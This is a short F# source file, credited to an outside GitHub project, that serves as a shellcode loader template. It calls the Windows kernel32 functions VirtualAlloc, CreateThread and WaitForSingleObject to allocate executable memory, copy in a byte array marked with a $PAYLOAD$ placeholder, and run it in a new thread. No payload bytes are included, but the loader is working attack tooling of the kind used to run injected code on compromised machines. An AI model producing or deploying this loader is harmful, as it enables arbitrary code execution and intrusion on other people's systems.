//This is from: https://github.com/vysecurity/FSharp-Shellcode
//Full credit goes to Vincent Yiu (@vysecurity) for developing this template.

open System
open System.Runtime.InteropServices
open System.Threading

[<DllImport "kernel32" >]
extern nativeint VirtualAlloc(
  nativeint         lpStartAddress,
  uint32            dwSize, 
  uint32            flAllocationType, 
  uint32         flProtect)

[<DllImport "kernel32" >]
extern nativeint CreateThread(
  uint32         lpThreadAttributes,
  uint32            dwStackSize, 
  nativeint            lpStartAddress, 
  uint32&         param,
  uint32         dwCreationFlags,
  uint32&         lpThreadId)

[<DllImport "kernel32" >]
extern nativeint WaitForSingleObject(
  nativeint         hHandle,
  uint32         dwMilliseconds)

  
let mutable threadId : uint32 = (uint32)0
let mutable pInfo : uint32 = (uint32)0
let mutable shellcode : byte[] = [|$PAYLOAD$|]

let address = VirtualAlloc((nativeint)0, (uint32)shellcode.Length, (uint32)0x1000, (uint32)0x40)

Marshal.Copy(shellcode, 0, address, shellcode.Length)
let hThread = CreateThread((uint32)0,(uint32)0, address, &pInfo, (uint32)0, &threadId)
WaitForSingleObject(hThread, (uint32)0xFFFFFFFF) |> ignore